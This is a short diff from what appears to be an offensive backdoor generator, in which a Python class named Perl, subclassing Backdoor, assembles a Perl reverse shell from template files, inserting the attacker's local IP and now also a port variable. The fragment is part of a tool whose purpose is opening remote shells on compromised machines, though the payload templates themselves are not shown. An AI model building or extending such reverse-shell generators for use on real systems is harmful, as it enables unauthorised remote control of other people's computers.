@@ -28,7 +28,7 @@ class Perl(Backdoor):
             data=myfile.read()
         data = data[:-1]#remove the last new line character.
         stringToAdd+=data + self.core.localIP
-
+        stringToAdd+="\';\nmy $port = " + str(port) + ";"
         with open ("backdoors/shell/perl/prs2", "r") as myfile:
             data=myfile.read()
         stringToAdd+=data
